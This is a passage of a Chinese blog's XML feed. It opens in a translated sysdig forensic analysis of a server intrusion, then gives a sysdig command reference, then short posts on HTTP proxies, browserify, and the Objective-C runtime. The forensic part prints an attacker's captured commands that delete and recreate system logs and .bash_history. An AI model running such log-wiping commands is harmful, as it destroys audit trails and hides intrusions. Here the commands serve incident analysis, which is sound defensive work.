$pid=fork;</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>perl进程将其argv改为一个随机化的普通名字，然后再fork自身，很有可能是用来作为守护进程。最后，攻击者决定删除日志并用新的来替换它们：<br><div><br><div id="highlighter_394666"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div><br><div>11</div><br><div>12</div><br><div>13</div><br><div>14</div><br><div>15</div><br><div>16</div><br><div>17</div></td><br><td><br><div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/wtmp</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/lastlog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/secure</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/xferlog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/messages</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/run/utmp</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/run/utmp</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/messages</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/wtmp</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/messages</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/xferlog</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/secure</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/lastlog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/maillog</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/maillog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/root/</code><code>.bash_history</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/root/</code><code>.bash_history</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br><h1>0x04 结论</h1><br><br><hr><br><br>哇噢。通过从高角度分析和在必要的时候深入到某个系统调用，我能够很准确地追踪到发生了什么。而这一切都是在实例完全关闭的情况下，仅仅使用<a href="http://www.sysdig.org/" target="_blank" rel="external">sysdig</a>来记录包含所有系统活动的文件！<br><h1>0x05 最后说明</h1><br><br><hr><br><br><ul><br>    <li>本篇博文中的所有IP地址都是经过随机化处理和隐藏的，因为其中的一些被攻击的服务器很可能仍然在使用，我不想暴露他们的任何信息。</li><br>    <li>因为如果I/O buffer被捕获的话记录文件很容易激增，所以在高负载的生产环境中进行持续性捕获是很困难的。设置一个好的捕获过滤器（例如过滤掉主Web服务器进程的事件）可以明显地缓解这一点。</li><br></ul><br><h1>0x06 译者注</h1><br><br><hr><br><br><h2><a href="https://github.com/draios/sysdig/wiki/How%20to%20Install%20Sysdig%20for%20Linux" target="_blank" rel="external">安装</a></h2><br>sysdig可直接在Kali2下安装：<br><div><br><div id="highlighter_743227"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div></td><br><td><br><div><br><div><code>apt-get -y </code><code>install</code> <code>sysdig</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2><a href="https://github.com/draios/sysdig/wiki/sysdig%20Quick%20Reference%20Guide#basic-command-list" target="_blank" rel="external">快速参考指南</a></h2><br><h3>命令格式</h3><br>sysdig [option]… [filter]<br><h3>命令选项</h3><br>-b, –print-base64<br><br>以base64的形式打印出数据buffer。这对二进制数据编码非常又用，进而可以将其用于处理文本数据的媒介中（例如，终端或者json）。<br><br>-c <em>chiselname chiselargs</em>, –chisel=<em>chiselname chiselargs</em><br><br>运行特定的chisel。如果某chisel需要传递参数，那么它们必须跟在chisel名之后。<br><br>-cl, –list-chisels<br><br>列出可用的chisel。其会在<code>.</code>,<code>./chisels</code>，<code>~/chisels</code>和<code>/usr/share/sysdig/chisels</code>中搜寻chisel。<br><br>-dv, –displayflt<br><br>为给定的过滤器设置输出。一旦设置了这个选项就会使事件在被状态系统解析后过滤。将事件在被分析前过滤是很有效的，但是可能会造成状态的丢失（例如FD名）。<br><br>-h, –help<br><br>打印出此帮助页面<br><br>-j, –json<br><br>以json的格式作为输出。数据buffer是否编码则取决于输出格式的选择。<br><br>-l, –list<br><br>列出可被过滤器和输出格式使用的字段。使用<code>-lv</code>将会得到每个字段的附加信息。<br><br>-L, –list-events<br><br>列出该设备支持的事件。<br><br>-n <em>num</em>, –numevents=<em>num</em><br><br>在一定事件后停止捕获<br><br>-p <em>output_format</em>, –print=<em>output_format</em><br><br>指定打印事件时使用的格式。可在examples部分获得更多相关信息。<br><br>-q, –quiet<br><br>不在屏幕上输出事件。这一点在dump到磁盘时非常有用。<br><br>-r <em>readfile</em>, –read=<em>readfile</em><br><br>从文件中读取事件。<br><br>-S, –summary<br><br>当捕获结束时打印出事件摘要（例如top事件列表）<br><br>-s <em>len</em>, –snaplen=<em>len</em><br><br>为每一个I/O buffer捕获的字节数。默认情况下，头80个字节会被捕获。请谨慎使用此选项，它可以产生巨大的记录文件。<br><br>-t <em>timetype</em>, –timetype=<em>timetype</em><br><br>更改事件时间的显示方式。可接收的值有：h用于人类可读的字符串，a用于绝对时间戳，r用于从开始捕获起的相对时间，d则用于事件登入登出中的delta。<br><br>-v, –verbose<br><br>详细输出。<br><br>-w <em>writefile</em>, –write=<em>writefile</em><br><br>将捕获的事件写入到<em>writefile</em>中。<br><h3>基本命令列表</h3><br>捕获当前的系统中的所有事件，并将其输出到屏幕上<br><blockquote>sysdig</blockquote><br>捕获当前的系统中的所有事件，并将其存储到磁盘中<br><blockquote>sysdig -qw dumpfile.scap</blockquote><br>从文件中读取事件，并将其输出到屏幕上<br><blockquote>sysdig -r dumpfile.scap</blockquote><br>打印出全部由cat引发的open操作系统调用<br><blockquote>sysdig proc.name=cat and evt.type=open</blockquote><br>打印出cat打开的文件名<br><blockquote>./sysdig -p”%evt.arg.name” proc.name=cat and evt.type=open</blockquote><br>列出可用的chisel<br><blockquote>./sysdig -cl</blockquote><br>为192.168.1.157IP地址运行spy_ip chisel<br><blockquote>sysdig –c spy_ip 192.168.1.157</blockquote><br><h3>输出格式</h3><br>在默认情况下，sysdig将在一行上打印出每个捕获事件的相关信息，以如下格式呈现：<br><br><code>&lt;evt.time&gt; &lt;evt.cpu&gt; &lt;proc.name&gt; &lt;thread.tid&gt; &lt;evt.dir&gt; &lt;evt.type&gt; &lt;evt.args&gt;</code><br><br>其中：<code>evt.time</code>为时间时间戳；<code>evt.cpu</code>为事件被捕获所处的CPU number；<code>proc.name</code>为事件产生的进程名；<code>thread.tid</code>为事件产生的TID，相对于单线程进程来说就是它的PID；<code>evt.dir</code>为事件的方向，<code>&gt;</code>为事件进入，<code>&lt;</code>为事件退出；<code>evt.type</code>为事件的名称，例如’<code>open</code>‘或者’<code>read</code>‘；<code>evt.args</code>则是事件参数列表。<br><br>可利用<code>-p</code>指定输出格式，也可用使用’<code>sysdig -l</code>‘列出所有的字段。<br><h3>Filtering</h3><br>可在命令行的结尾设定sysdig过滤器。最简单的过滤器就是一个简单的域值检测：<br><blockquote>$ sysdig proc.name=cat</blockquote><br>利用’<code>sysdig -l</code>‘可得到所有可用的字段。以下对比操作符皆可用来检测相关内容：<code>=</code>，<code>!=</code>，<code>&lt;</code>，<code>&lt;=</code>，<code>&gt;</code>，<code>&gt;=</code>和<code>contains</code>。例如：<br><blockquote>$ sysdig fd.name contains /etc</blockquote><br>可使用括号和布尔运算符<code>and</code>，<code>or</code>，<code>not</code>进行多重检测：<br><blockquote>$ sysdig “not(fd.name contains /proc or fd.name contains /dev)”</blockquote><br><h3>Chisels</h3><br>Sysdig中的chisels是分析sysdig事件流并执行有用的操作小脚本。如下输入可得到可用的chisel列表：<br><blockquote>$ sysdig –cl</blockquote><br>对于每一个chisel，你必须键入相应的名字和其预期的参数。可使用<code>-c</code>运行一个chisel，例如：<br><blockquote>$ sysdig –c topfiles_bytes</blockquote><br>如果一个chisel需要参数，可在chisel名后设定：<br><blockquote>$ sysdig –c spy_ip 192.168.1.157</blockquote><br>Chiesls可与filters联合使用：<br><blockquote>$ sysdig -c topfiles_bytes “not fd.name contains /dev”</blockquote><br><h2><a href="https://github.com/draios/sysdig/wiki/Sysdig%20Examples" target="_blank" rel="external">使用实例</a></h2><br><h3>Networking</h3><br><ul><br>    <li>在网络带宽使用方面查看top进程</li><br></ul><br><blockquote>sysdig -c topprocs_net</blockquote><br><ul><br>    <li>显示与主机192.168.0.1交换的网络数据</li><br></ul><br><blockquote>as binary: sysdig -s2000 -X -c echo_fds fd.cip=192.168.0.1 as ASCII: sysdig -s2000 -A -c echo_fds fd.cip=192.168.0.1</blockquote><br><ul><br>    <li>查看本地服务器top端口</li><br></ul><br><blockquote>in terms of established connections: sysdig -c fdcount_by fd.sport “evt.type=accept” in terms of total bytes: sysdig -c fdbytes_by fd.sport</blockquote><br><ul><br>    <li>查看top客服端IP</li><br></ul><br><blockquote>in terms of established connections sysdig -c fdcount_by fd.cip “evt.type=accept” in terms of total bytes sysdig -c fdbytes_by fd.cip</blockquote><br><ul><br>    <li>列出所有不是由apache服务的接入连接</li><br></ul><br><blockquote>sysdig -p”%proc.name %fd.name” “evt.type=accept and proc.name!=httpd”</blockquote><br><h3>Containers</h3><br><ul><br>    <li>查看运行在机器上的containers列表和他们的资源使用情况</li><br></ul><br><blockquote>sudo csysdig -vcontainers</blockquote><br><ul><br>    <li>查看container上下文中的进程列表</li><br></ul><br><blockquote>sudo csysdig -pc</blockquote><br><ul><br>    <li>查看wordpress1 container内运行的进程的CPU使用率</li><br></ul><br><blockquote>sudo sysdig -pc -c topprocs_cpu container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container内运行的进程的网络带宽占用率</li><br></ul><br><blockquote>sudo sysdig -pc -c topprocs_net container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container中使用着最大网络带宽的进程</li><br></ul><br><blockquote>sudo sysdig -pc -c topprocs_net container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container中I/O方面的top文件</li><br></ul><br><blockquote>sudo sysdig -pc -c topfiles_bytes container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container中的top网络连接</li><br></ul><br><blockquote>sudo sysdig -pc -c topconns container.name=wordpress1</blockquote><br><ul><br>    <li>显示所有在wordpress1 container中执行的交互式命令</li><br></ul><br><blockquote>sudo sysdig -pc -c spy_users container.name=wordpress1</blockquote><br><h3>Application</h3><br><ul><br>    <li>查看设备产生的所有HTTP GET请求</li><br></ul><br><blockquote>sudo sysdig -s 2000 -A -c echo_fds fd.port=80 and evt.buffer contains GET</blockquote><br><ul><br>    <li>查看设备产生的所有SQL select查询</li><br></ul><br><blockquote>sudo sysdig -s 2000 -A -c echo_fds evt.buffer contains SELECT</blockquote><br><ul><br>    <li>查看通过apache传到外部MySQL服务端的实时查询</li><br></ul><br><blockquote>sysdig -s 2000 -A -c echo_fds fd.sip=192.168.30.5 and proc.name=apache2 and evt.buffer contains SELECT</blockquote><br><h3>Disk I/O</h3><br><ul><br>    <li>查看在磁盘带宽使用方面的top进程</li><br></ul><br><blockquote>sysdig -c topprocs_file</blockquote><br><ul><br>    <li>列出正在使用大量文件的进程</li><br></ul><br><blockquote>sysdig -c fdcount_by proc.name “fd.type=file”</blockquote><br><ul><br>    <li>查看在读写字节方面的top文件</li><br></ul><br><blockquote>sysdig -c topfiles_bytes</blockquote><br><ul><br>    <li>打印出apache已经读取或者写入的top文件</li><br></ul><br><blockquote>sysdig -c topfiles_bytes proc.name=httpd</blockquote><br><ul><br>    <li>基本的open监控，监控文件open操作</li><br></ul><br><blockquote>sysdig -p “%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name” evt.type=open</blockquote><br><ul><br>    <li>查看在读写磁盘活动方面的top目录</li><br></ul><br><blockquote>sysdig -c fdbytes_by fd.directory “fd.type=file”</blockquote><br><ul><br>    <li>查看在/tmp目录下读写磁盘活动的top目录</li><br></ul><br><blockquote>sysdig -c fdbytes_by fd.filename “fd.directory=/tmp/“</blockquote><br><ul><br>    <li>观察所有名为’passwd’文件的I/O活动</li><br></ul><br><blockquote>sysdig -A -c echo_fds “fd.filename=passwd”</blockquote><br><ul><br>    <li>以FD type显示I/O活动</li><br></ul><br><blockquote>sysdig -c fdbytes_by fd.type</blockquote><br><h3>Processes and CPU usage</h3><br><ul><br>    <li>查看在CPU使用率方面的top进程</li><br></ul><br><blockquote>sysdig -c topprocs_cpu</blockquote><br><ul><br>    <li>查看一个进程的标准输出</li><br></ul><br><blockquote>sysdig -s4096 -A -c stdout proc.name=cat</blockquote><br><h3>Performance and Errors</h3><br><ul><br>    <li>查看花销了大量时间的文件</li><br></ul><br><blockquote>sysdig -c topfiles_time</blockquote><br><ul><br>    <li>查看apache花销了大量时间的文件</li><br></ul><br><blockquote>sysdig -c topfiles_time proc.name=httpd</blockquote><br><ul><br>    <li>查看在I/O错误方面的top进程</li><br></ul><br><blockquote>sysdig -c topprocs_errors</blockquote><br><ul><br>    <li>查看在I/O错误方面的top文件</li><br></ul><br><blockquote>sysdig -c topfiles_errors</blockquote><br><ul><br>    <li>查看所有失败的磁盘I/O调用</li><br></ul><br><blockquote>sysdig fd.type=file and evt.failed=true</blockquote><br><ul><br>    <li>查看httpd所有失败的文件open</li><br></ul><br><blockquote>sysdig “proc.name=httpd and evt.type=open and evt.failed=true”</blockquote><br><ul><br>    <li>查看花销时间最长的系统调用</li><br></ul><br><blockquote>See the system calls where most time has been spent</blockquote><br><ul><br>    <li>查看那些返回错误的系统调用</li><br></ul><br><blockquote>sysdig -c topscalls “evt.failed=true”</blockquote><br><ul><br>    <li>监控失败的文件open操作</li><br></ul><br><blockquote>sysdig -p “%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name” evt.type=open and evt.failed=true</blockquote><br><ul><br>    <li>打印出延时超过1ms的文件I/O调用：</li><br></ul><br><blockquote>sysdig -c fileslower 1</blockquote><br><h3>Security</h3><br><ul><br>    <li>显示出”root”用户访问的目录</li><br></ul><br><blockquote>sysdig -p”%evt.arg.path” “evt.type=chdir and user.name=root”</blockquote><br><ul><br>    <li>观察ssh活动</li><br></ul><br><blockquote>sysdig -A -c echo_fds fd.name=/dev/ptmx and proc.name=sshd</blockquote><br><ul><br>    <li>显示出在<code>/etc</code>目录下的每一个文件open操作</li><br></ul><br><blockquote>sysdig evt.type=open and fd.name contains /etc</blockquote><br><ul><br>    <li>显示出所有使用了”tar”命令的login shell的ID</li><br></ul><br><blockquote>sysdig -r file.scap -c list_login_shells tar</blockquote><br><ul><br>    <li>显示出给定ID的login shell执行的所有命令</li><br></ul><br><blockquote>sysdig -r trace.scap.gz -c spy_users proc.loginshellid=5459</blockquote><br><ul><br>    <li>使用sysdig的取证分析案例：<br><ul><br>    <li><a href="http://draios.com/fishing-for-hackers/" target="_blank" rel="external">Fishing for Hackers: Analysis of a Linux Server Attack</a></li><br>    <li><a href="http://draios.com/fishing-for-hackers-part-2/" target="_blank" rel="external">Fishing for Hackers (Part 2): Quickly Identify Suspicious Activity With Sysdig</a></li><br>    <li></li><br></ul><br></li><br></ul><br>&nbsp;<br><br><br><div><br><div><a name="colloct-button"></a></div><br></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;article&gt;&lt;section&gt;原文：&lt;a href=&quot;http://drops.wooyun.org/tips/14148&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://drops.wooyun.org/tips/14148&lt;/a&gt;&lt;/
    
    </summary>
    
      <category term="WebDev" scheme="http://blog.pickbox.me/categories/WebDev/"/>
    
    
  </entry>
  
  <entry>
    <title>HTTP代理原理及实现</title>
    <link href="http://blog.pickbox.me/2016/03/15/HTTP%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"/>
    <id>http://blog.pickbox.me/2016/03/15/HTTP代理原理及实现/</id>
    <published>2016-03-15T04:20:41.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><a style="line-height: 1.5em;" href="http://img.pickbox.me/wp-content/uploads/HTTP代理原理及实现（一）.pdf" target="_blank" rel="external">HTTP代理原理及实现（一）</a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/HTTP代理原理及实现（二）.pdf" target="_blank" rel="external">HTTP代理原理及实现（二）</a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/Http代理请求头中的Proxy-Connection和Request-URL.pdf" target="_blank" rel="external">Http代理请求头中的Proxy-Connection和Request-URL</a></p>
<p>&nbsp;</p>
<p>参考：</p>
<p><a href="https://imququ.com/post/the-proxy-connection-header-in-http-request.html" target="_blank" rel="external">https://imququ.com/post/the-proxy-connection-header-in-http-request.html</a></p>
<p>&nbsp;</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a style=&quot;line-height: 1.5em;&quot; href=&quot;http://img.pickbox.me/wp-content/uploads/HTTP代理原理及实现（一）.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HTTP代理原理
    
    </summary>
    
      <category term="Network" scheme="http://blog.pickbox.me/categories/Network/"/>
    
    
  </entry>
  
  <entry>
    <title>mink：浏览器模拟</title>
    <link href="http://blog.pickbox.me/2016/03/14/mink%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E6%8B%9F/"/>
    <id>http://blog.pickbox.me/2016/03/14/mink：浏览器模拟/</id>
    <published>2016-03-13T16:14:44.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Travis-CI：自动化安装环境、运行脚本<br>behat+mink：测试网页、模拟加载/操作网页、顺序执行task并判断是否满足预期</p>
<p><a href="http://img.pickbox.me/wp-content/uploads/mink_scenario_1.png" target="_blank" rel="external"><img class="alignnone size-full wp-image-1205" alt="mink_scenario_1" src="http://img.pickbox.me/wp-content/uploads/mink_scenario_1.png" width="567" height="412"></a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/mink_scenario_2.png" target="_blank" rel="external"><img class="alignnone size-full wp-image-1206" alt="mink_scenario_2" src="http://img.pickbox.me/wp-content/uploads/mink_scenario_2.png" width="567" height="412"></a></p>
<p>参考：<br>developing web applications with behat and mink：<br><a href="http://docs.behat.org/en/v2.5/cookbook/behat_and_mink.html" target="_blank" rel="external">http://docs.behat.org/en/v2.5/cookbook/behat_and_mink.html</a></p>
<p>Automating Behat and Mink tests with Travis CI<br><a href="http://robbiemackay.com/2013/05/03/automating-behat-and-mink-tests-with-travis-ci/" target="_blank" rel="external">http://robbiemackay.com/2013/05/03/automating-behat-and-mink-tests-with-travis-ci/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Travis-CI：自动化安装环境、运行脚本&lt;br&gt;behat+mink：测试网页、模拟加载/操作网页、顺序执行task并判断是否满足预期&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://img.pickbox.me/wp-content/uploads/mink_scena
    
    </summary>
    
      <category term="python/js/php/html/mysql/http" scheme="http://blog.pickbox.me/categories/python-js-php-html-mysql-http/"/>
    
    
  </entry>
  
  <entry>
    <title>移动端高清、多屏适配方案 - 移动端 H5</title>
    <link href="http://blog.pickbox.me/2016/03/04/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%AB%98%E6%B8%85%E3%80%81%E5%A4%9A%E5%B1%8F%E9%80%82%E9%85%8D%E6%96%B9%E6%A1%88-%E7%A7%BB%E5%8A%A8%E7%AB%AF-H5/"/>
    <id>http://blog.pickbox.me/2016/03/04/移动端高清、多屏适配方案-移动端-H5/</id>
    <published>2016-03-04T06:35:57.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://img.pickbox.me/wp-content/uploads/移动端高清、多屏适配方案-移动端-H5-前端乱炖.pdf" target="_blank" rel="external">移动端高清、多屏适配方案 - 移动端 H5 - 前端乱炖</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://img.pickbox.me/wp-content/uploads/移动端高清、多屏适配方案-移动端-H5-前端乱炖.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;移动端高清、多屏适配方案 - 移动端 H5 - 前端
    
    </summary>
    
      <category term="python/js/php/html/mysql/http" scheme="http://blog.pickbox.me/categories/python-js-php-html-mysql-http/"/>
    
    
  </entry>
  
  <entry>
    <title>How can I Configure Memcache on XAMPP in Linux</title>
    <link href="http://blog.pickbox.me/2015/11/18/How-can-I-Configure-Memcache-on-XAMPP-in-Linux/"/>
    <id>http://blog.pickbox.me/2015/11/18/How-can-I-Configure-Memcache-on-XAMPP-in-Linux/</id>
    <published>2015-11-18T09:42:55.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://img.pickbox.me/wp-content/uploads/How-can-I-Configure-Memcache-on-XAMPP-in-Linux.pdf" target="_blank" rel="external">How can I Configure Memcache on XAMPP in Linux</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://img.pickbox.me/wp-content/uploads/How-can-I-Configure-Memcache-on-XAMPP-in-Linux.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How 
    
    </summary>
    
      <category term="WebDev" scheme="http://blog.pickbox.me/categories/WebDev/"/>
    
    
  </entry>
  
  <entry>
    <title>browserify生成代码</title>
    <link href="http://blog.pickbox.me/2015/10/14/browserify%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/"/>
    <id>http://blog.pickbox.me/2015/10/14/browserify生成代码/</id>
    <published>2015-10-14T02:23:34.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>browserify test.js test2.js -o bundle.js </p>
<pre>
(function outer (modules, cache, entry) {
    // Save the require from previous bundle to this closure if any
    var previousRequire = typeof require == &quot;function&quot; && require;

    function newRequire(name, jumped){
        if(!cache[name]) {
            if(!modules[name]) {
                // if we cannot find the the module within our internal map or
                // cache jump to the current global require ie. the last bundle
                // that was added to the page.
                var currentRequire = typeof require == &quot;function&quot; && require;
                if (!jumped && currentRequire) return currentRequire(name, true);

                // If there are other bundles on this page the require from the
                // previous one is saved to 'previousRequire'. Repeat this as
                // many times as there are bundles until the module is found or
                // we exhaust the require chain.
                if (previousRequire) return previousRequire(name, true);
                throw new Error('Cannot find module \'' + name + '\'');
            }
            var m = cache[name] = {exports:{}};
            modules[name][0].call(m.exports, function(x){
                var id = modules[name][1][x];
                return newRequire(id ? id : x);
            },m,m.exports,outer,modules,cache,entry);
        }
        return cache[name].exports;
    }
    for(var i=0;i&lt;entry.length;i++) newRequire(entry[i]);

    // Override the current require with this new one
    return newRequire;
})({
    1 : [function(require, module, exports) {
        function a() {}

        module.exports = a;

    },
    {}],
    2 : [function(require, module, exports) {
        var a = require('./test.js');
        function b() {}
        module.exports = b;

    },
    {
        &quot;./test.js&quot;: 1
    }]
},
{},
[1, 2]);
</pre>

<p>browerify自动添加的代码模板参考<a href="https://github.com/substack/browser-pack/blob/d29fddc8a9207d5f967664935073b50971aff708/prelude.js" target="_blank">prelude.js</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;browserify test.js test2.js -o bundle.js &lt;/p&gt;
&lt;pre&gt;
(function outer (modules, cache, entry) {
    // Save the require from previous bundl
    
    </summary>
    
      <category term="js/html/python" scheme="http://blog.pickbox.me/categories/js-html-python/"/>
    
    
  </entry>
  
  <entry>
    <title>Objective-C Runtime － Self, Super Class, Meta Class</title>
    <link href="http://blog.pickbox.me/2015/08/20/Objective-C-Runtime-%EF%BC%8D-Self-Super-Class-Meta-Class/"/>
    <id>http://blog.pickbox.me/2015/08/20/Objective-C-Runtime-－-Self-Super-Class-Meta-Class/</id>
    <published>2015-08-20T08:44:22.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://img.pickbox.me/wp-content/uploads/ObjC_class_diagram.png" target="_blank" rel="external"><img src="http://img.pickbox.me/wp-content/uploads/ObjC_class_diagram.png" alt="ObjC_class_diagram" width="664" height="692" class="alignnone size-full wp-image-1183"></a></p>
<pre>
//Test.m
@implementation Test

#define ClsLog(tag, cls, isaCls) NSLog(@&quot;%30s %s&lt;%p&gt;, isa:%s&lt;%p&gt;&quot;, tag, class_getName(cls), cls, object_getClassName(cls), isaCls)

- (void)test {
    Class cls = [self class];
    Class isaCls = object_getClass(cls);
    ClsLog(&quot;[self class]&quot;, cls, isaCls);

    cls = [super class];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[super class]&quot;, cls, isaCls);

    cls = [self superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[self superclass]&quot;, cls, isaCls);

    cls = [super superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[super superclass]&quot;, cls, isaCls);

    cls = [Test superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test superclass]&quot;, cls, isaCls);

    cls = [Test class];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test class]&quot;, cls, isaCls);

    cls = objc_getMetaClass(&quot;Test&quot;);
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test meta]&quot;, cls, isaCls);

    cls = objc_getMetaClass(object_getClassName(cls));
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test meta isa]&quot;, cls, isaCls);

    cls = [cls superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test meta isa superclass]&quot;, cls, isaCls);
}

@end
</pre>

<pre>
            [self class] Test&lt;0x105e001f8&gt;, isa:Test&lt;0x105e00220&gt;
           [super class] Test&lt;0x105e001f8&gt;, isa:Test&lt;0x105e00220&gt;
         [self supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
        [super supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
         [Test supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
            [Test class] Test&lt;0x105e001f8&gt;, isa:Test&lt;0x105e00220&gt;
             [Test meta] Test&lt;0x105e00220&gt;, isa:NSObject&lt;0x10654dd50&gt;
         [Test meta isa] NSObject&lt;0x10654dd50&gt;, isa:NSObject&lt;0x10654dd50&gt;
[Test meta isa supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
</pre>

<pre>
//runtime/NSObject.mm
@implementation NSObject

+ (Class)class {
    return self;
}

- (Class)class {
    return object_getClass(self);
}

+ (Class)superclass {
    return self-&gt;superclass;
}

- (Class)superclass {
    return [self class]-&gt;superclass;
}

@end

//runtime/objc-class.mm
Class object_getClass(id obj)
{
    if (obj) return obj-&gt;getIsa();
    else return Nil;
}

////
const char *object_getClassName(id obj)
{
    return class_getName(obj ? obj-&gt;getIsa() : nil);
}

const char *class_getName(Class cls)
{
    if (!cls) return &quot;nil&quot;;
    assert(cls-&gt;isRealized()  ||  cls-&gt;isFuture());
    return cls-&gt;demangledName();
}
</pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://img.pickbox.me/wp-content/uploads/ObjC_class_diagram.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;img src=&quot;http://img.pickbox.me/
    
    </summary>
    
      <category term="iOS" scheme="http://blog.pickbox.me/categories/iOS/"/>
    
    
  </entry>
  
  <entry>
    <title>iOS runtime理解</title>
    <link href="http://blog.pickbox.me/2015/08/13/iOS-runtime%E7%90%86%E8%A7%A3/"/>
    <id>http://blog.pickbox.me/2015/08/13/iOS-runtime理解/</id>
    <published>2015-08-13T02:59:49.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p></p><h1>iOS~runtime理解</h1><p></p>
<div>原文链接：<a href="http://www.jianshu.com/p/927c8384855a" target="_blank" rel="external">http://www.jianshu.com/p/927c8384855a</a></div><br><div>PDF下载：<a href="http://img.pickbox.me/wp-content/uploads/iOS_runtime理解.pdf" target="_blank" rel="external">iOS_runtime理解</a></div><br><div><br><blockquote>Runtime是想要做好iOS开发，或者说是真正的深刻的掌握OC这门语言所必需理解的东西。最近在学习Runtime，有自己的一些心得，整理如下，<br>一为 查阅方便<br>二为 或许能给他人一些启发，<br>三为 希望得到大家对这篇整理不足之处的一些指点。</blockquote><br><h2>什么是Runtime</h2><br><ul><br>    <li>我们写的代码在程序运行过程中都会被转化成runtime的C代码执行，例如<code>[target doSomething];</code>会被转化成<code>objc_msgSend(target, @selector(doSomething));</code>。</li><br>    <li>OC中一切都被设计成了对象，我们都知道一个类被初始化成一个实例，这个实例是一个对象。实际上一个类本质上也是一个对象，在runtime中用结构体表示。</li><br>    <li>相关的定义：</li><br></ul><br><pre><code>/// 描述类中的一个方法<br>typedef struct objc_method <em>Method;<br><br>/// 实例变量<br>typedef struct objc_ivar </em>Ivar;<br><br>/// 类别Category<br>typedef struct objc_category <em>Category;<br><br>/// 类中声明的属性<br>typedef struct objc_property </em>objc_property_t;</code></pre><br><ul><br>    <li>类在runtime中的表示</li><br></ul><br><pre><code>//类在runtime中的表示<br>struct objc_class {<br>    Class isa;//指针，顾名思义，表示是一个什么，<br>    //实例的isa指向类对象，类对象的isa指向元类<br><br>#if !<strong>OBJC2</strong><br>    Class super_class;  //指向父类<br>    const char <em>name;  